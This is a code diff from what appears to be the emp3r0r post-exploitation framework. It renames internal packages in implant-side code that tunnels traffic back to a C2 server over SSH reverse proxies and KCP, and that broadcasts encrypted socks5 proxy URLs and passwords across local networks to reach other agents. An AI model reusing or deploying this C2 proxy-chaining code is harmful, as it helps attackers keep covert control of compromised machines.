@@ -9,9 +9,9 @@ import (
 	"strconv"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -40,7 +40,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 	// reverseProxy listener
 	// ssh reverse proxy
 	go func() {
-		err = tun.SSHRemoteFwdServer(RuntimeConfig.Bring2CCReverseProxyPort,
+		err = transport.SSHRemoteFwdServer(RuntimeConfig.Bring2CCReverseProxyPort,
 			RuntimeConfig.Password,
 			RuntimeConfig.SSHHostKey)
 		if err != nil {
@@ -51,11 +51,11 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 	// kcp server that forwards to ssh reverse proxy
 	go func() {
 		ctx, cancel := context.WithCancel(context.Background())
-		err = tun.KCPTunServer(
+		err = transport.KCPTunServer(
 			fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.Bring2CCReverseProxyPort), // forward to ssh reverse proxy
 			RuntimeConfig.KCPServerPort,
 			RuntimeConfig.Password,
-			emp3r0r_def.MagicString,
+			def.MagicString,
 			ctx, cancel)
 		if err != nil {
 			log.Printf("KCP tunnel for reverse proxy: %v", err)
@@ -75,13 +75,13 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		// wait for the proxy to work
 		for {
 			if RuntimeConfig.C2TransportProxy != "" {
-				if tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_def.CCAddress) {
+				if transport.IsProxyOK(RuntimeConfig.C2TransportProxy, def.CCAddress) {
 					log.Printf("BroadcastServer reverse proxy checker: proxy '%s' is already working", RuntimeConfig.C2TransportProxy)
 					util.TakeASnap()
 					continue
 				}
 			}
-			if tun.IsProxyOK(rproxy, emp3r0r_def.CCAddress) {
+			if transport.IsProxyOK(rproxy, def.CCAddress) {
 				break
 			}
 			util.TakeASnap()
@@ -104,14 +104,14 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		}
 
 		// decrypt broadcast message
-		decBytes, err := emp3r0r_crypto.AES_GCM_Decrypt(emp3r0r_def.AESKey, buf[:n])
+		decBytes, err := crypto.AES_GCM_Decrypt(def.AESKey, buf[:n])
 		if err != nil {
 			log.Printf("BroadcastServer: %v", err)
 		}
 		decMsg := string(decBytes)
 		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
 		if RuntimeConfig.C2TransportProxy != "" &&
-			tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_def.CCAddress) {
+			transport.IsProxyOK(RuntimeConfig.C2TransportProxy, def.CCAddress) {
 			log.Printf("BroadcastServer: proxy %s already set and working fine\n", RuntimeConfig.C2TransportProxy)
 			continue
 		}
@@ -130,7 +130,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		proxy_url := fmt.Sprintf("socks5://127.0.0.1:%s", RuntimeConfig.ShadowsocksLocalSocksPort)
 
 		// test proxy
-		is_proxy_ok := tun.IsProxyOK(proxy_url, emp3r0r_def.CCAddress)
+		is_proxy_ok := transport.IsProxyOK(proxy_url, def.CCAddress)
 
 		// if the proxy is not working
 		// restart Shadowsocks local socks5 proxy
@@ -139,7 +139,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		}
 
 		// test proxy again
-		is_proxy_ok = tun.IsProxyOK(proxy_url, emp3r0r_def.CCAddress)
+		is_proxy_ok = transport.IsProxyOK(proxy_url, def.CCAddress)
 
 		if is_proxy_ok {
 			RuntimeConfig.C2TransportProxy = proxy_url
@@ -178,7 +178,7 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 			return
 		}
 		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
-		err := tun.TCPFwd(parsed_url.Host, RuntimeConfig.AgentSocksServerPort, ctx, cancel)
+		err := transport.TCPFwd(parsed_url.Host, RuntimeConfig.AgentSocksServerPort, ctx, cancel)
 		if err != nil {
 			log.Print("TCPFwd: ", err)
 		}
@@ -202,7 +202,7 @@ func BroadcastMsg(msg, dst string) (err error) {
 	}
 
 	// encrypt message
-	encMsg, err := emp3r0r_crypto.AES_GCM_Encrypt(emp3r0r_def.AESKey, []byte(msg))
+	encMsg, err := crypto.AES_GCM_Encrypt(def.AESKey, []byte(msg))
 	if err != nil {
 		return fmt.Errorf("failed to encrypt %s", msg)
 	}
@@ -241,13 +241,13 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 	for ctx.Err() == nil {
 		log.Print("Broadcasting our proxy...")
 		time.Sleep(time.Duration(util.RandInt(RuntimeConfig.ProxyChainBroadcastIntervalMin, RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)
-		ips := tun.IPaddr()
+		ips := transport.IPaddr()
 		for _, netip := range ips {
 			proxyMsg := fmt.Sprintf("socks5://%s:%s@%s:%s",
 				RuntimeConfig.ShadowsocksLocalSocksPort,
 				RuntimeConfig.Password,
 				netip.IP.String(), RuntimeConfig.AgentSocksServerPort)
-			broadcastAddr := tun.IPbroadcastAddr(netip)
+			broadcastAddr := transport.IPbroadcastAddr(netip)
 			if broadcastAddr == "" {
 				continue
 			}
